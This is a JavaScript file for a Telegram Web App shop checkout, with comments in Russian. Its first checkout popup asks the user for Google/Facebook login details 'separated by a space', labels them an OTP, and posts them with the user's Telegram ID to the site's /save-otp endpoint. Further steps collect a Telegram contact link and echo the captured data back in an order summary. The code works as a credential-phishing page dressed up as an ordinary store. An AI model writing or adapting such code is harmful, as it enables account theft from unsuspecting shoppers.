Telegram.WebApp.ready();

// Отключаем возможность закрытия жестом "pull-to-close"
Telegram.WebApp.disableClosingConfirmation();


document.addEventListener("DOMContentLoaded", () => {
    const checkoutButton = document.getElementById("checkout-button");

    checkoutButton.addEventListener("click", async () => {
    if (window.Telegram && window.Telegram.WebApp) {
        const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
        // Выводим Telegram ID в консоль сервера, отправив его через fetch
         fetch("/save-tg-id", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ tg_id: userId }),
        })}




        // Закрываем окно корзины
        const cartDropdown = document.querySelector('.cart-dropdown');
        cartDropdown.classList.remove('active');

        // Показываем всплывающее окно оформления заказа (первый шаг)
        showOrderPopup();
    });

    function showOrderPopup() {
        const popup = document.createElement("div");
        popup.classList.add("order-popup");
        popup.innerHTML = `
        <div class="order-popup-content">
            <button class="order-popup-close">
                <img src="/static/images/crest.png" alt="Закрыть">
            </button>
            <h2>Пришлите через пробел данные от Google/Facebook* для входа в мобильную версию.</h2>
            <div class="order-input-container">
                <input type="text" id="order-input" />
            </div>
            <button class="next-btn">
                <img src="/static/images/next.png" alt="Далее">
            </button>
        </div>`;

        document.body.appendChild(popup);

        // Обработчик закрытия окна
        popup.querySelector(".order-popup-close").addEventListener("click", () => {
            popup.remove();
        });

        // Обработчик для кнопки "Далее" в первом окне
        popup.querySelector(".next-btn").addEventListener("click", () => {
            // Если нужно, можно сохранить данные первого шага:
            const otpData = document.getElementById("order-input").value;
            if (!otpData) {
                alert("Введите OTP-код!");
                return;
            }
            if (window.Telegram && window.Telegram.WebApp) {
                const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
                // Выводим Telegram ID в консоль сервера, отправив его через fetch
                 fetch("/save-otp", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({ tg_id: userId, otp: otpData}),
                })}
            popup.remove();
            // Показываем второе окно для ввода ссылки Telegram
            showTelegramPopup();
        });
    }

    function showTelegramPopup() {
        const popup = document.createElement("div");
        popup.classList.add("order-popup");
        popup.innerHTML = `
        <div class="order-popup-content">
            <button class="order-popup-close">
                <img src="/static/images/crest.png" alt="Закрыть">
            </button>
            <h2>Введите ссылку для связи в Telegram:</h2>
            <div class="order-input-container">
                <input type="text" id="telegram-input" placeholder="Telegram ссылка" />
            </div>
            <button class="next-btn">
                <img src="/static/images/next.png" alt="Далее">
            </button>
        </div>`;

        document.body.appendChild(popup);

        // Обработчик закрытия окна
        popup.querySelector(".order-popup-close").addEventListener("click", () => {
            popup.remove();
        });

        // Обработчик для кнопки "Далее" во втором окне
        popup.querySelector(".next-btn").addEventListener("click", () => {
            const telegramLink = document.getElementById("telegram-input").value.trim();
            if (!telegramLink) {
                alert("Введите ссылку для связи в Telegram!");
                return;
            }
            if (window.Telegram && window.Telegram.WebApp) {
                const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
                // Выводим Telegram ID в консоль сервера, отправив его через fetch
                 fetch("/save_tg_link", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({ tg_id: userId, link: telegramLink}),
                })}
            popup.remove();

            // После ввода ссылки, запрашиваем с сервера последнюю запись заказа для текущего Telegram ID
            fetchLatestOrder(window.Telegram.WebApp.initDataUnsafe.user.id);
        });
    }

    function fetchLatestOrder(telegramId) {
        fetch('/api/order/latest', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ telegram_id: telegramId })
        })
        .then(response => {
            if (!response.ok) {
                throw new Error("Ошибка получения заказа");
            }
            return response.json();
        })
        .then(order => {
            console.log("Полученный заказ:", order);
            showOrderDetailsPopup(order);
        })
        .catch(error => {
            console.error("Ошибка:", error);
            alert("Не удалось получить данные заказа");
        });
    }

    function showOrderDetailsPopup(order) {
        const popup = document.createElement("div");
        popup.classList.add("order-popup");
        popup.innerHTML = `
        <div class="order-popup-content">
            <button class="order-popup-close">
                <img src="/static/images/crest.png" alt="Закрыть">
            </button>
            <h2>Детали заказа</h2>
            <p><strong>Номер заказа:</strong> ${order.id}</p>
            <p><strong>Telegram ID:</strong> ${order.user_id}</p>
            <p><strong>Корзина:</strong> ${order.cart}</p>
            <p><strong>OTP:</strong> ${order.otp_code}</p>
            <p><strong>Telegram ссылка:</strong> ${order.telegram_link}</p>
            <button class="confirm-btn">Подтверждаю</button>
        </div>`;

        document.body.appendChild(popup);

        popup.querySelector(".order-popup-close").addEventListener("click", () => {
            popup.remove();
        });

        popup.querySelector(".confirm-btn").addEventListener("click", async () => {
    // Проверяем, что Telegram Web App инициализирован
            if (window.Telegram && window.Telegram.WebApp) {
                // Проверяем, что initDataUnsafe.user существует
                const user = window.Telegram.WebApp.initDataUnsafe.user;
                if (user && user.id) {
                    const userId = user.id;

                    try {
                        // Отправляем запрос на сервер
                        const response = await fetch('/api/order/end', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ telegram_id: userId })
                        });

                        // Проверяем, что запрос выполнен успешно

                        console.log('Запрос выполнен успешно');
                        // Закрываем Telegram Web App
                        window.Telegram.WebApp.close();

                    } catch (error) {
                        console.error('Ошибка при отправке запроса:', error);
                    }
                } else {
                    console.error('Пользователь не определен в initDataUnsafe');
                }
            } else {
                console.error('Telegram Web App не инициализирован');
            }
        });
    }
});
